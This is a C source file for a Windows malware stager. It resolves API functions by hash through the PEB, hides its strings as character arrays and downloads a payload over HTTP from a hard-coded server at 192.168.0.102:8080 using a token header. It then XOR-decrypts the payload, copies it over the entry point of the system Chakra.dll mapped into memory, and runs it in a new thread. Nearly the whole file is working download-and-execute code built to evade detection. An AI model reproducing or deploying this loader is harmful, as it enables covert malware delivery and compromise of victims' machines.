#include <windows.h>
#include "structs.h"



UINT64 GetModule(DWORD dwHash) {

	PPEB pPeb;
	PPEB_LDR_DATA pLdr;
	PLDR_DATA_TABLE_ENTRY pLdte, pHead;

	pPeb = (PPEB)__readgsqword(0x60);
	pLdr = pPeb->Ldr;
	pLdte = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;
	pHead = pLdte;

	do {
		if (HashDjb2W(pLdte->BaseDllName.Buffer) == dwHash) {
			return (UINT64)pLdte->DllBase;
		}

		pLdte = (PLDR_DATA_TABLE_ENTRY)((PLIST_ENTRY)pLdte)->Flink;
	}while (pLdte != pHead);

	return 0;
}

UINT64 GetProcAddrHash(UINT64 hModule, DWORD dwHash) {

	if (!hModule) {
		return 0;
	}
	PIMAGE_EXPORT_DIRECTORY pImgExp;

	pImgExp = (PIMAGE_EXPORT_DIRECTORY)(hModule + ((PIMAGE_NT_HEADERS)(hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD  pAddressOfFunctions = (PDWORD)(hModule + pImgExp->AddressOfFunctions);
	PDWORD  pAddressofNames = (PDWORD)(hModule + pImgExp->AddressOfNames);
	PWORD   pAddressofOrdinals = (PWORD)(hModule + pImgExp->AddressOfNameOrdinals);

	for (int i = 0; i < pImgExp->NumberOfFunctions; i++) {
		if (HashDjb2A((CHAR*)(hModule + pAddressofNames[i])) == dwHash) {
			WORD	wOrdinal = pAddressofOrdinals[i];
			return (UINT64)(hModule + pAddressOfFunctions[wOrdinal]);
		}
	}

	return 0;
}


BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPoint, PNTAPIFP pNtApi) {

	HANDLE				hFile = INVALID_HANDLE_VALUE,
						hSection = NULL;
	NTSTATUS			STATUS = STATUS_SUCCESS;
	ULONG_PTR			uMappedModule = NULL;
	SIZE_T				sViewSize = NULL;
	PIMAGE_NT_HEADERS	pImageNtHeaders = NULL;
	PIMAGE_DOS_HEADER	pImageDosHeader = NULL;
	HANDLE				hFileMap = INVALID_HANDLE_VALUE;



	if ((hFile = ((fnCreateFileW)pNtApi->pCreateFileW)(szDllFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE) {


		if (NT_SUCCESS((STATUS = pNtApi->pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0X00, PAGE_READONLY, SEC_IMAGE, hFile)))) {

			if (NT_SUCCESS((STATUS = pNtApi->pNtMapViewOfSection(hSection, (HANDLE)-1, &uMappedModule, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
				*phModule = uMappedModule;
				pImageDosHeader = (PIMAGE_DOS_HEADER)uMappedModule;
				pImageNtHeaders = (PIMAGE_NT_HEADERS)(uMappedModule + pImageDosHeader->e_lfanew);
				*puEntryPoint = uMappedModule + pImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

				return TRUE;
			}

		}

	}

	return FALSE;

}

VOID ExecuteShellcode(unsigned char* shellcode, SIZE_T szSize, UINT64 kernel32dll, LPWSTR wsSacrificialDll, PNTAPIFP pNtApi) {

	LPVOID		pAddress = NULL;
	HANDLE		hThread = INVALID_HANDLE_VALUE;
	HMODULE		hModule = NULL;
	ULONG_PTR	uEntryPoint = NULL;
	DWORD		dwOldProtection = 0;
	unsigned char	cKey = 0xff;

	UINT64 VirtualProtectFunc, CreateThreadFunc, WaitForSingleObjectFunc;

	VirtualProtectFunc = (UINT64)GetProcAddrHash(kernel32dll, VIRTUALPROTECT_HASH);
	CreateThreadFunc = (UINT64)GetProcAddrHash(kernel32dll, CREATETHREAD_HASH);
	WaitForSingleObjectFunc = (UINT64)GetProcAddrHash(kernel32dll, WAITFORSINGLEOBJECT_HASH);


	if (LoadDllFile(wsSacrificialDll, &hModule, &uEntryPoint, pNtApi)) {



		if (((fnVirtualProtect)VirtualProtectFunc)(uEntryPoint, szSize, PAGE_READWRITE, &dwOldProtection)) {
			my_memcpy(uEntryPoint, shellcode, szSize);
			XorDecrypt(uEntryPoint, cKey, szSize);
			if (((fnVirtualProtect)VirtualProtectFunc)(uEntryPoint, szSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
				hThread = ((fnCreateThread)CreateThreadFunc)(NULL, 0X00, uEntryPoint, NULL, 0x00, NULL);
				((fnWaitForSingleObject)WaitForSingleObjectFunc)(hThread, INFINITE);
			}
		}

	}
}

VOID DownloadExec() {


	HINTERNET		hInternet = NULL,
					hConnect  = NULL,
					hRequest  = NULL;



	DWORD			dwStatusCode = 0;
	DWORD			dwLength = sizeof(DWORD);
	DWORD			dwBytesAvailable;
	BYTE			*pMessageBody = NULL, *pShellCode = NULL;
	DWORD			dwSizeOfPayload = 0;
	BOOL			bSuccess = TRUE;

	CHAR			useragent[] = {'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '6', '.', '1', ';', ' ', 'W', 'O', 'W', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '9', '6', '.', '0', '.', '4', '6', '6', '4', '.', '1', '1', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', 0};
	CHAR			domain[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', '0', '2', 0};
	INTERNET_PORT	nServerPort = 8080;
	CHAR			requestType[] = {'G', 'E', 'T', 0};
	CHAR			resource[] = {'i', 'n', 'd', 'e', 'x', '.', 'p', 'h', 'p', 0};
	CHAR 			header[35] = {'W', 'W', 'W', '-', 'A', 'u', 't', 'h', 'e', 'n', 't', 'i', 'c', 'a', 't', 'e', ':', ' '};
					header[34] = 0x00;
	UINT64 			token = 0xb757959dc4ad5b04;
	

	
	WCHAR	wsSacrificialDLL[] = {L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'C', L'h', L'a', L'k', L'r', L'a', L'.', L'd', L'l', L'l', 0};

	UINT64  wininetdll, msvcrtdll, ntdll, kernel32dll;
	UINT64	InternetOpenAFunc, InternetConnectAFunc, HttpOpenRequestAFunc, HttpSendRequestAFunc, HttpQueryInfoAFunc, InternetQueryDataAvailableFunc,
			InternetReadFileFunc, InternetCloseHandleFunc, callocFunc, freeFunc, LoadLibraryAFunc;

	NTAPIFP ntApi = { 0x00 };

	//Kernel32.DLL
	kernel32dll = (UINT64)GetModule(KERNEL32_HASH);
	LoadLibraryAFunc = GetProcAddrHash(kernel32dll, LOADLIBRARYA_HASH);


	//WinInet.DLL Functions
	CHAR wininetdll_c[] = {'w', 'i', 'n', 'i', 'n', 'e', 't', 0};
	wininetdll = (UINT64)((fnLoadLibraryA)LoadLibraryAFunc)(wininetdll_c);
	InternetOpenAFunc = (UINT64)GetProcAddrHash(wininetdll, InternetOpenA_HASH);
	InternetConnectAFunc = (UINT64)GetProcAddrHash(wininetdll, InternetConnectA_HASH);
	HttpOpenRequestAFunc = (UINT64)GetProcAddrHash(wininetdll, HttpOpenRequestA_HASH);
	HttpSendRequestAFunc = (UINT64)GetProcAddrHash(wininetdll, HttpSendRequestA_HASH);
	HttpQueryInfoAFunc = (UINT64)GetProcAddrHash(wininetdll, HttpQueryInfoA_HASH);
	InternetQueryDataAvailableFunc = (UINT64)GetProcAddrHash(wininetdll, InternetQueryDataAvailable_HASH);
	InternetReadFileFunc = (UINT64)GetProcAddrHash(wininetdll, InternetReadFile_HASH);
	InternetCloseHandleFunc = (UINT64)GetProcAddrHash(wininetdll, InternetCloseHandle_HASH);

	//MSVCRT.DLL Functions
	CHAR msvcrtdll_c[] = {'m', 's', 'v', 'c', 'r', 't', 0};
	msvcrtdll = (UINT64)((fnLoadLibraryA)LoadLibraryAFunc)(msvcrtdll_c);
	callocFunc = (UINT64)GetProcAddrHash(msvcrtdll, calloc_HASH);
	freeFunc = (UINT64)GetProcAddrHash(msvcrtdll, free_HASH);
	

	//NTDLL.DLL
	ntdll = (UINT64)GetModule(NTDLL_HASH);
	ntApi.pNtCreateSection = (fnNtCreateSection)GetProcAddrHash(ntdll, NtCreateSection_HASH);
	ntApi.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddrHash(ntdll, NtMapViewOfSection_HASH);
	ntApi.pCreateFileW = (fnCreateFileW)GetProcAddrHash(kernel32dll, CreateFileW_HASH);

	if ((hInternet = ((fnInternetOpenA)InternetOpenAFunc)(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0))) {


		if ((hConnect = ((fnInternetConnectA)InternetConnectAFunc)(hInternet, domain, nServerPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))) {

			if ((hRequest = ((fnHttpOpenRequestA)HttpOpenRequestAFunc)(hConnect, requestType, resource, NULL, NULL, NULL, 0, 0))) {



					headercat(header, token);

					if ((((fnHttpSendRequestA)HttpSendRequestAFunc)(hRequest, header, 35, NULL, 0))) {


						if (((fnHttpQueryInfoA)HttpQueryInfoAFunc)(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwLength, NULL)) {

							if (dwStatusCode == HTTP_STATUS_OK) {

								while (((fnInternetQueryDataAvailable)InternetQueryDataAvailableFunc)(hRequest, &dwBytesAvailable, 0, 0)) {


									DWORD dwBytesRead;


									if (!dwSizeOfPayload) {


										if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, &dwSizeOfPayload, sizeof(DWORD), &dwBytesRead)) {

											pMessageBody = (BYTE*)((fncalloc)callocFunc)(1, dwSizeOfPayload);
											if (pMessageBody == NULL)
												return;
											pShellCode = pMessageBody;

										}

										if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, pMessageBody, dwBytesAvailable - 4, &dwBytesRead)) {

											if (dwBytesRead == 0) {
												bSuccess = FALSE;
												break;
											}

											pMessageBody = (BYTE*)((ULONG_PTR)pMessageBody + dwBytesRead);

										}

									}
									else {

										if (((fnInternetReadFile)InternetReadFileFunc)(hRequest, pMessageBody, dwBytesAvailable, &dwBytesRead)) {

											if (dwBytesRead == 0)
												break;

											pMessageBody = (BYTE*)((ULONG_PTR)pMessageBody + dwBytesRead);

										}

									}

								}
								
							}
						}
					}

			}


		}

		if (bSuccess)
			ExecuteShellcode(pShellCode, dwSizeOfPayload, kernel32dll, wsSacrificialDLL, &ntApi);

		((fnfree)freeFunc)(pShellCode);
		((fnInternetCloseHandle)InternetCloseHandleFunc)(hRequest);
		((fnInternetCloseHandle)InternetCloseHandleFunc)(hConnect);
		((fnInternetCloseHandle)InternetCloseHandleFunc)(hInternet);
	}

}
